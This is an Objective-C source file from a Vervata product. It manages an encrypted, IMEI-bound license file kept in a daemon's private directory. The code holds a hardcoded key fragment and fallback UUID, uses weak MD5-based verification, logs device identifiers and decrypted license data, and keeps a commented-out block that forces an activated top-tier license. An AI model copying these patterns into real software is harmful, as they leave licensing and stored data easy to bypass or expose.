//
//  LicenseManager.m
//  LicenseManager
//
//  Created by Pichaya Srifar on 10/3/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "LicenseManager.h"
#import "LicenseInfo.h"

#import "AESCryptor.h"
#import "AppContext.h"
#import "DaemonPrivateHome.h"
#import "DefStd.h"
#import "ConfigurationID.h"

#import "AutomateAESKeyLICENSE.h"

#if !TARGET_OS_IPHONE
#import "MacInfoImp.h"
#endif

#import <CommonCrypto/CommonDigest.h>

@interface LicenseManager (private)
- (void) checkVerifyLicenseFile;
- (void) checkLicenseFile;
- (BOOL) verifyLicenseInfo;

- (void) notifyListener;
@end

@implementation LicenseManager

@synthesize mListenerList;
@synthesize mCurrentLicenseInfo;
@synthesize mFilePath;
@synthesize mAppContext;

#pragma mark - singleton declaration

- (id) initWithAppContext: (id <AppContext>) aAppContext {
	if ((self = [super init])) {
		[self setMAppContext:aAppContext];
		if (mFilePath == nil) {
#if TARGET_IPHONE_SIMULATOR	
			NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
			NSString *docPath = [paths objectAtIndex:0];
			NSString *filePath = [docPath stringByAppendingPathComponent:@"i.os"];
			[self setMFilePath:filePath];
#else
			NSString *filePath = [NSString stringWithFormat:@"%@lic/", [DaemonPrivateHome daemonPrivateHome]];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:filePath];
			[self setMFilePath:[NSString stringWithFormat:@"%@i.os", filePath]];
#endif
			DLog(@"License file path = %@", [self mFilePath]);
		}
		[self setMListenerList:[NSMutableArray array]];
		[self checkVerifyLicenseFile];
	}
	return (self);
}

#pragma mark - instance method

- (BOOL)commitLicense:(LicenseInfo *)licenseInfo {
	if (![licenseInfo activationCode] || ![licenseInfo md5]) {
		return NO;
	}
	if ([[licenseInfo activationCode] length] > 256 || [[licenseInfo md5] length] != 16) {
		return NO;
	}
	
	if (mFilePath == nil) {
		return NO;
	}
	
	NSFileManager *fileMgr = [NSFileManager defaultManager];
    
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		[licenseInfo setActivationCode:_DEFAULTACTIVATIONCODE_];
		[licenseInfo setMd5:[DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]];
		[licenseInfo setConfigID:CONFIG_DEFAULT];
	}
    
	NSString *activationCode = [licenseInfo activationCode];
	uint8_t activationCodeSize = [activationCode lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	uint8_t dataSize = activationCodeSize + 23;
	uint8_t licenseStatus = [licenseInfo licenseStatus];
	uint32_t configID = [licenseInfo configID];
	NSData *md5 = [licenseInfo md5];        
    
	NSMutableData *licenseData = [NSMutableData data];
	[licenseData appendBytes:&dataSize length:sizeof(dataSize)];
	[licenseData appendBytes:&licenseStatus length:sizeof(licenseStatus)];
	[licenseData appendBytes:&configID length:sizeof(configID)];
	[licenseData appendData:md5];
	[licenseData appendBytes:&activationCodeSize length:sizeof(activationCodeSize)];
	[licenseData appendData:[activationCode dataUsingEncoding:NSUTF8StringEncoding]];

	// Generate key from uuid 8 bytes and hard code 8 byets
	NSMutableString *fakeKey = [NSMutableString stringWithCapacity:16];
    #if TARGET_OS_IPHONE
	NSString *uuid = @"126e3bdc50a92b03b6225a6c03b8b7b0acd93893";
    UIDevice *device = [UIDevice currentDevice];
    if ([device respondsToSelector:@selector(uniqueIdentifier)]) {
        NSString *uniqueID = [device performSelector:@selector(uniqueIdentifier)];
        if (uniqueID != nil && [uniqueID length] > 8) {
            uuid = uniqueID;
        }
    }
    #else
	MacInfoImp *macInfo = [[MacInfoImp alloc] init];
    NSString *uuid		= [macInfo getIMEI];
	[macInfo release];
    #endif
    
    DLog(@"Commit, device UUID = %@", uuid);
    
	[fakeKey appendString:[uuid substringToIndex:8]];
	//[fakeKey appendString:@"6b3JjabP"];
	[fakeKey appendString:@"6"];
	[fakeKey appendString:@"a"];
	[fakeKey appendString:@"3"];
	[fakeKey appendString:@"J"];
	[fakeKey appendString:@"j"];
	[fakeKey appendString:@"a"];
	[fakeKey appendString:@"b"];
	[fakeKey appendString:@"P"];
	
	char licenseKey[16];
	licenseKey[0] = license0();
	licenseKey[1] = license1();
	licenseKey[2] = license2();
	licenseKey[3] = license3();
	licenseKey[4] = license4();
	licenseKey[5] = license5();
	licenseKey[6] = license6();
	licenseKey[7] = license7();
	licenseKey[8] = license8();
	licenseKey[9] = license9();
	licenseKey[10] = license10();
	licenseKey[11] = license11();
	licenseKey[12] = license12();
	licenseKey[13] = license13();
	licenseKey[14] = license14();
	licenseKey[15] = license15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//	NSString *aesKey = [[[NSString alloc] initWithBytes:licenseKey
//												 length:16
//											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:licenseKey length:16];

	DLog(@"licenseData to encrypt: %@", licenseData);
	AESCryptor *cryptor = [[AESCryptor alloc] init];
	
	// Obsolete
//	NSData *encrypted = [cryptor encrypt:licenseData withKey:aesKey];
	
	NSData *encrypted = [cryptor encryptv2:licenseData withKey:aesKey];
	DLog(@"Encrypted license data: %@", encrypted);
	[cryptor release];

	
	NSError *error = nil;
	
	if ([fileMgr fileExistsAtPath:mFilePath]) {
		[fileMgr removeItemAtPath:mFilePath error:&error];
		if (error) {
			DLog(@"DEBUG Can not removeItemAtPath = %@", mFilePath);
			return NO;
		}
	}

	[encrypted writeToFile:mFilePath atomically:YES];
	//[encrypted writeToFile:mFilePath options:0 error:&error];
	
	if (error) {
		DLog(@"DEBUG can not write file = %@", mFilePath);
		return NO;
	} else {
		[self setMCurrentLicenseInfo:licenseInfo];
		[self notifyListener];
		return YES;
	}
}

- (void) resetLicense {
	LicenseInfo *licInfo = [[[LicenseInfo alloc] init] autorelease];
	[licInfo setLicenseStatus:DEACTIVATED];
	[licInfo setConfigID:CONFIG_DEFAULT];
	[licInfo setMd5:[DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]];
	[licInfo setActivationCode:_DEFAULTACTIVATIONCODE_];
	if (![self commitLicense:licInfo]) {
		DLog (@"****************************************************************************************************");
		DLog (@"****************************** License manager did reset license FAIL ******************************");
		DLog (@"****************************************************************************************************");
	} else {
        DLog (@"*******************************************************************************************************");
		DLog (@"****************************** License manager did reset license SUCCESS ******************************");
		DLog (@"*******************************************************************************************************");
    }
}

- (NSString *)getActivationCode {
    if (mCurrentLicenseInfo != nil) {
        return [mCurrentLicenseInfo activationCode];
    }
    return _DEFAULTACTIVATIONCODE_;
}

- (NSInteger)getConfiguration {
    if (mCurrentLicenseInfo != nil) {
        return [mCurrentLicenseInfo configID];
    }
    return CONFIG_DEFAULT;
}

- (LicenseStatus)getLicenseStatus {
    if (mCurrentLicenseInfo != nil) {
        return [mCurrentLicenseInfo licenseStatus];
    }
    return DEACTIVATED;
}

- (NSData *)getMD5 {
    if (mCurrentLicenseInfo != nil) {
        return [mCurrentLicenseInfo md5];
    }
    return ([DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]);
}

- (BOOL)isActivated:(NSInteger)configID withMD5:(NSData *)MD5 {
	if (mCurrentLicenseInfo == nil || MD5 == nil) {
		return NO;
	}
	if (configID == [mCurrentLicenseInfo configID] && [MD5 isEqualToData:[mCurrentLicenseInfo md5]]) {
		if ([mCurrentLicenseInfo licenseStatus] == ACTIVATED) {
			return YES;
		}
	}
	return NO;
}

- (void)addLicenseChangeListener:(id<LicenseChangeListener>)listener {
	[mListenerList addObject:listener];
}

- (void)removeLicenseChangeListener:(id<LicenseChangeListener>)listener {
	[mListenerList removeObject:listener];
}

- (void)removeAllLicenseChangeListener {
	[mListenerList removeAllObjects];
}

- (BOOL) isLicenseCorrupt {
    BOOL corrupt = NO;
    NSFileManager *fileMgr = [NSFileManager defaultManager];
	if ([fileMgr fileExistsAtPath:mFilePath]) {
		@try {
			// Generate key from uuid 8 bytes and hard code 8 byets
			NSMutableString *fakeKey = [NSMutableString stringWithCapacity:16];
            
            #if TARGET_OS_IPHONE
            NSString *uuid = @"126e3bdc50a92b03b6225a6c03b8b7b0acd93893";
            UIDevice *device = [UIDevice currentDevice];
            if ([device respondsToSelector:@selector(uniqueIdentifier)]) {
                NSString *uniqueID = [device performSelector:@selector(uniqueIdentifier)];
                if (uniqueID != nil && [uniqueID length] > 8) {
                    uuid = uniqueID;
                }
            }
            #else
			MacInfoImp *macInfo = [[MacInfoImp alloc] init];
			NSString *uuid		= [macInfo getIMEI];
			[macInfo release];
            #endif
            
			DLog(@"Corrupt check, device UUID = %@", uuid);
            
			[fakeKey appendString:[uuid substringToIndex:8]];
			//[fakeKey appendString:@"6b3JjabP"];
			[fakeKey appendString:@"6"];
			[fakeKey appendString:@"a"];
			[fakeKey appendString:@"3"];
			[fakeKey appendString:@"J"];
			[fakeKey appendString:@"j"];
			[fakeKey appendString:@"a"];
			[fakeKey appendString:@"b"];
			[fakeKey appendString:@"P"];
			
			char licenseKey[16];
			licenseKey[0] = license0();
			licenseKey[1] = license1();
			licenseKey[2] = license2();
			licenseKey[3] = license3();
			licenseKey[4] = license4();
			licenseKey[5] = license5();
			licenseKey[6] = license6();
			licenseKey[7] = license7();
			licenseKey[8] = license8();
			licenseKey[9] = license9();
			licenseKey[10] = license10();
			licenseKey[11] = license11();
			licenseKey[12] = license12();
			licenseKey[13] = license13();
			licenseKey[14] = license14();
			licenseKey[15] = license15();
			
			// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//			NSString *aesKey = [[[NSString alloc] initWithBytes:licenseKey
//														 length:16
//													   encoding:NSUTF8StringEncoding] autorelease];
			
			NSData *aesKey = [NSData dataWithBytes:licenseKey length:16];
			
			NSData *fileData = [NSData dataWithContentsOfFile:mFilePath];
			AESCryptor *cryptor = [[AESCryptor alloc] init];
			
			// Obsolete
//			NSData *decryptedData = [cryptor decrypt:fileData withKey:aesKey
			
			NSData *decryptedData = [cryptor decryptv2:fileData withKey:aesKey];
			[cryptor release];
			
			NSInteger offset = 0;
			uint8_t checkSize;
			uint8_t licenseStatus;
			uint32_t configID;
			NSData *md5;
			uint8_t activationCodeSize;
			NSString *activationCode;
			
			[decryptedData getBytes:&checkSize length:sizeof(checkSize)];
			offset+=sizeof(checkSize);
			
			if (checkSize == [decryptedData length]) {
				[decryptedData getBytes:&licenseStatus range:NSMakeRange(offset, sizeof(licenseStatus))];
				offset+=sizeof(licenseStatus);
				
				[decryptedData getBytes:&configID range:NSMakeRange(offset, sizeof(configID))];
				offset+=sizeof(configID);
				
				md5 = [decryptedData subdataWithRange:NSMakeRange(offset, 16)];
				offset+=16;
				
				[decryptedData getBytes:&activationCodeSize range:NSMakeRange(offset, sizeof(activationCodeSize))];
				offset+=sizeof(activationCodeSize);
				
				activationCode = [[NSString alloc] initWithData:[decryptedData subdataWithRange:NSMakeRange(offset, activationCodeSize)] encoding:NSUTF8StringEncoding];
				[activationCode release];
				
            } else {
                corrupt = YES;
                DLog(@"License is corrupt because cannot decrypt");
            }
		}
		@catch (...) {
            corrupt = YES;
            DLog(@"License is corrupt because there is an exception while reading & parsing");
		}
		@finally {
			
		}
    }
    return (corrupt);
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) checkVerifyLicenseFile {
	// Check IMEI whether it's available
	NSString *IMEI = [[[self mAppContext] getPhoneInfo] getIMEI];
	if ([IMEI length]) {
		DLog (@"<<<<<<<<<<<<<< IMEI is now ready thus do verification >>>>>>");
		[self checkLicenseFile];
	} else { // Wait for IMEI ready for 5 seconds
		DLog (@"<<<<<<<<<<<<< IMEI is now NOT ready thus wait for 5 seconds >>>>>");
		[self performSelector:@selector(checkVerifyLicenseFile)
				   withObject:nil
				   afterDelay:5.00];
	}
}

- (void) checkLicenseFile {
	LicenseInfo *licenseInfo = [[LicenseInfo alloc] init];
	NSFileManager *fileMgr = [NSFileManager defaultManager];
	if ([fileMgr fileExistsAtPath:mFilePath]) {
		@try {
			// Generate key from uuid 8 bytes and hard code 8 byets
			NSMutableString *fakeKey = [NSMutableString stringWithCapacity:16];
                        
			#if TARGET_OS_IPHONE
            NSString *uuid = @"126e3bdc50a92b03b6225a6c03b8b7b0acd93893";
            UIDevice *device = [UIDevice currentDevice];
            if ([device respondsToSelector:@selector(uniqueIdentifier)]) {
                NSString *uniqueID = [device performSelector:@selector(uniqueIdentifier)];
                if (uniqueID != nil && [uniqueID length] > 8) {
                    uuid = uniqueID;
                }
            }
			#else
			MacInfoImp *macInfo = [[MacInfoImp alloc] init];	
			NSString *uuid		= [macInfo getIMEI];
			[macInfo release];
			#endif
            
            /**************************************************************************************************************************************
             iOS 7 iPhone 4 white (tested), after device is restarted and phone is locked with passcode, device unique identifer (uuid) sometime
             returns nil, if it happens line of code below will throw exception "[__NSCFString appendString:]: nil argument".
             
             In this case license never get verified and application will be in deactivate state. It's consistent with issue reported by customer.
             **************************************************************************************************************************************/
            DLog(@"Verify, device UUID = %@", uuid);
            
			[fakeKey appendString:[uuid substringToIndex:8]];
			//[fakeKey appendString:@"6b3JjabP"];
			[fakeKey appendString:@"6"];
			[fakeKey appendString:@"a"];
			[fakeKey appendString:@"3"];
			[fakeKey appendString:@"J"];
			[fakeKey appendString:@"j"];
			[fakeKey appendString:@"a"];
			[fakeKey appendString:@"b"];
			[fakeKey appendString:@"P"];
			
			char licenseKey[16];
			licenseKey[0] = license0();
			licenseKey[1] = license1();
			licenseKey[2] = license2();
			licenseKey[3] = license3();
			licenseKey[4] = license4();
			licenseKey[5] = license5();
			licenseKey[6] = license6();
			licenseKey[7] = license7();
			licenseKey[8] = license8();
			licenseKey[9] = license9();
			licenseKey[10] = license10();
			licenseKey[11] = license11();
			licenseKey[12] = license12();
			licenseKey[13] = license13();
			licenseKey[14] = license14();
			licenseKey[15] = license15();
			
			// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//			NSString *aesKey = [[[NSString alloc] initWithBytes:licenseKey
//														 length:16
//													   encoding:NSUTF8StringEncoding] autorelease];
			
			NSData *aesKey = [NSData dataWithBytes:licenseKey length:16];
			
			NSData *fileData = [NSData dataWithContentsOfFile:mFilePath];
			DLog(@"License file data = %@", fileData);
			AESCryptor *cryptor = [[AESCryptor alloc] init];
			
			// Obsolete
//			NSData *decryptedData = [cryptor decrypt:fileData withKey:aesKey
			
			NSData *decryptedData = [cryptor decryptv2:fileData withKey:aesKey];
			DLog(@"License file decrypted data = %@", decryptedData);
			[cryptor release];
			
			NSInteger offset = 0;
			uint8_t checkSize;
			uint8_t licenseStatus;
			uint32_t configID;
			NSData *md5;
			uint8_t activationCodeSize;
			NSString *activationCode;
			
			[decryptedData getBytes:&checkSize length:sizeof(checkSize)];
			offset+=sizeof(checkSize);
			
			if (checkSize == [decryptedData length]) {
				[decryptedData getBytes:&licenseStatus range:NSMakeRange(offset, sizeof(licenseStatus))];
				offset+=sizeof(licenseStatus);
				//DLog(@"licenseStatus = %d", licenseStatus);
				[decryptedData getBytes:&configID range:NSMakeRange(offset, sizeof(configID))];
				offset+=sizeof(configID);
				//DLog(@"setConfigID = %d", configID);
				md5 = [decryptedData subdataWithRange:NSMakeRange(offset, 16)];
				offset+=16;
				//DLog(@"md5 %@", md5);
				//DLog(@"offset %d", offset);
				
				[decryptedData getBytes:&activationCodeSize range:NSMakeRange(offset, sizeof(activationCodeSize))];
				offset+=sizeof(activationCodeSize);
				//DLog(@"activationCode size = %d, sizeof() activationCode = %d", activationCodeSize, sizeof(activationCodeSize));
				activationCode = [[NSString alloc] initWithData:[decryptedData subdataWithRange:NSMakeRange(offset, activationCodeSize)] encoding:NSUTF8StringEncoding];
				
				[licenseInfo setLicenseStatus:licenseStatus];
				[licenseInfo setConfigID:configID];
				[licenseInfo setMd5:md5];
				[licenseInfo setActivationCode:activationCode];
				
				[activationCode release];
				
			} else {
				DLog(@"Check decrypted size failed");
                [licenseInfo setActivationCode:_DEFAULTACTIVATIONCODE_];
                [licenseInfo setMd5:[DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]];
                [licenseInfo setConfigID:CONFIG_DEFAULT];
				[licenseInfo setLicenseStatus:DEACTIVATED];
			}
		}
		@catch (NSException *exception) {
			DLog(@"Read license got exception = %@", exception);
            [licenseInfo setActivationCode:_DEFAULTACTIVATIONCODE_];
            [licenseInfo setMd5:[DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]];
            [licenseInfo setConfigID:CONFIG_DEFAULT];
			[licenseInfo setLicenseStatus:DEACTIVATED];
		}
		@finally {
			
		}                
	} else {
		// file is not exists
		[licenseInfo setActivationCode:_DEFAULTACTIVATIONCODE_];
		[licenseInfo setMd5:[DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]];
		[licenseInfo setConfigID:CONFIG_DEFAULT];
		[licenseInfo setLicenseStatus:DEACTIVATED];
	}
	
	[self setMCurrentLicenseInfo:licenseInfo];
	[licenseInfo release];

	DLog(@"licenseStatus = %d", [[self mCurrentLicenseInfo] licenseStatus]);
    DLog(@"setConfigID = %ld", (long)[[self mCurrentLicenseInfo] configID]);
	DLog(@"md5 = %@", [[self mCurrentLicenseInfo] md5]);
	DLog(@"activationCode = %@", [[self mCurrentLicenseInfo] activationCode]);
	
	if ([self verifyLicenseInfo]) {
		// Notify license listener
		DLog(@"********* License is verified -----")
//		[NSTimer scheduledTimerWithTimeInterval:0.5
//										 target:self
//									   selector:@selector(notifyListener)
//									   userInfo:nil
//										repeats:NO];
	} else {
		DLog(@"********* License is NOT verified -----")
	}
	// Notify license listener in all cases
	[NSTimer scheduledTimerWithTimeInterval:0.5
									 target:self
								   selector:@selector(notifyListener)
								   userInfo:nil
									repeats:NO];
}

- (BOOL) verifyLicenseInfo {
	// P_ID + CONFIG_ID + IMEI + TAILS
	BOOL verified = FALSE;
	if ([[self mCurrentLicenseInfo] licenseStatus] == ACTIVATED ||
		[[self mCurrentLicenseInfo] licenseStatus] == EXPIRED ||
		[[self mCurrentLicenseInfo] licenseStatus] == DISABLE) {
		NSString *pId = [NSString stringWithFormat:@"%ld", (long)[[mAppContext getProductInfo] getProductID]];
		NSString *configId = [NSString stringWithFormat:@"%ld", (long)[[self mCurrentLicenseInfo] configID]];
		NSData *imei = [[[mAppContext getPhoneInfo] getIMEI] dataUsingEncoding:NSUTF8StringEncoding];
		NSData *tails = [[[mAppContext getProductInfo] getProtocolHashTail] dataUsingEncoding:NSUTF8StringEncoding];
        DLog(@"PID = %@, ConfigID = %@, IMEI = %@, Tails = %@", pId, configId, imei, tails);
        
		NSMutableData* msg2Digest = [NSMutableData data];
		[msg2Digest appendData:[pId dataUsingEncoding:NSUTF8StringEncoding]];
		[msg2Digest appendData:[configId dataUsingEncoding:NSUTF8StringEncoding]];
		[msg2Digest appendData:imei];
		[msg2Digest appendData:tails];
        
		unsigned char msgDigest[16];
		CC_MD5([msg2Digest bytes], [msg2Digest length], msgDigest);
		NSData* msgDataDigest = [NSData dataWithBytes:msgDigest length:16];
		DLog(@"msgDataDigest: %@", msgDataDigest);
		DLog(@"self.lic.md5: %@", [[self mCurrentLicenseInfo] md5]);
        
		if ([msgDataDigest isEqualToData:[[self mCurrentLicenseInfo] md5]]) {
			verified = TRUE;
		} else {
			// Reset license status to DEACTIVATED
			LicenseInfo *licenseInfo = [[LicenseInfo alloc] init];
			[licenseInfo setLicenseStatus:DEACTIVATED];
			[licenseInfo setActivationCode:_DEFAULTACTIVATIONCODE_];
			[licenseInfo setMd5:[DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]];
			[licenseInfo setConfigID:CONFIG_DEFAULT];
			[self setMCurrentLicenseInfo:licenseInfo];
		}
	}
	
	return (verified);
}

- (void) notifyListener {
	//DLog(@"Notify license info listener")
	for (id<LicenseChangeListener> listener in mListenerList) {
        
        /*********************************
         Hard code license activate
         *********************************/
        /*
        LicenseInfo *licenseInfo = [[LicenseInfo alloc] init];
        [licenseInfo setActivationCode:_DEFAULTACTIVATIONCODE_];
        [licenseInfo setMd5:[DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]];
        [licenseInfo setConfigID:CONFIG_EXTREME_ADVANCED];
        [licenseInfo setLicenseStatus:ACTIVATED];
        [self setMCurrentLicenseInfo:licenseInfo];
        [licenseInfo release];
        */
		[listener onLicenseChanged:mCurrentLicenseInfo];
	}
}

#pragma mark -
#pragma mark Memory management methods
#pragma mark -

- (void)dealloc {
    [mListenerList release];
    [mCurrentLicenseInfo release];
    [mFilePath release];
    [mAppContext release];
    [super dealloc];
}


@end
